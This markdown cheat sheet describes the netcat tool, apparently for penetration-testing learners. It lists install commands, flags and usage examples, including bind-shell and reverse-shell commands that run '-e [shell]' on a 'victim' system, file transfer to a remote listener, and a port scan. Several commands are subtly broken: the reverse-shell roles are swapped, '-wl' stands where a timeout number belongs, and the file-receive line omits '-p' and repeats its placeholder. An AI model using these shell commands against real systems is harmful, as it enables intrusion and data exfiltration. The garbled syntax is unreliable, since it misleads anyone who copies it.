# Cybersecurity Utility - netcat

## Table of Contents
- [Information](#information)
- [Setup](#setup)
- [Documentation](#documentation)
- [Resources](#resources)
- [References](#references)
- [Remarks](#remarks)
- [Notes](#notes)

## Information

+ Utility Type: Network Debugging and Exploration
+ Tool Area of Efficiency : Offensive (Red Team), Defensive (Blue Team)
+ Penetration Testing stage : Reconnaissance
+ Package Name: netcat
+ Repository URL: 

### DESCRIPTION

```
netcat - also known as 'nc', is a command-line utility for Linux used by network administrators and security experts that can read and write data across network connections using the TCP and UDP protocol.

It is designed to be a reliable "backend" tool used directly or driven by other programs via scripts.

nc is also a feature-rich network debugging and exploration tool.
```

## Setup

### Pre-Requisites


### Dependencies


### Obtaining
- Using Package Manager
	- Debian-based (apt)
		```console
		sudo apt(-get) install netcat
		```
	- Arch-based (pacman)
		```console
		sudo pacman -S netcat
		```

## Documentation

### Synopsis/Syntax

```console
nc [{options} [arguments]...] [target-ip] [port-number]
```

### Parameters
+ -e [shell] : Executes the specified shell when connected
+ -h : Display this help menu
+ -l : Start listener/server mode to connect from a remote system
+ -n : Do not do any DNS or service lookups on any specific addresses, hostnames or ports
+ -p [port-number] : Set a port number to listen through
+ -v : Verbose; Display detailed information of the standard output
+ -w [timeout] : Set connections to timeout after [timeout] seconds if cannot be established or are idle
+ -z : Specifies that nc should only scan for listening daemons, without sending any data to them; Cannot use with *-l*

### Usage
- Connect to a target on port 21
	```console
	nc 10.0.2.5 21
	```
- Connect a remote target/victim system (Bind Shell)
	- On the target/victim system
		```console
		nc -l -v -p [port-number-to-listen] -e [shell]
		```
	- On the attacker system
		```console
		nc [target-ip-address] [port-number-to-connect]
		```

- Connect from a remote target/victim system (Reverse Shell)
	- On the target/victim system
		```console
		nc [target-ip-address] [port-number-to-connect]
		```
	- On the attacker system
		```console
		nc -l -v -p [port-number-to-listen] -e [shell]
		```

- To transfer a file 
	- To send a file in the source machine
		```console
		nc [destination-IP-address] [listening-port-number] < [file-name]
		```
	- To receive file in the destination machine
		```console
		nc -l -v [port-to-listen] > [file-to-receive][file-to-receive]
		```

- TCP Port Scanner
	```console
	nc -v -n -z -wl [domain-name or IP address] [start_port_number-end_port_number]
	```

## Resources

## References
+ [computerhope - nc](https://www.computerhope.com/unix/nc.htm)

## Remarks

## Notes
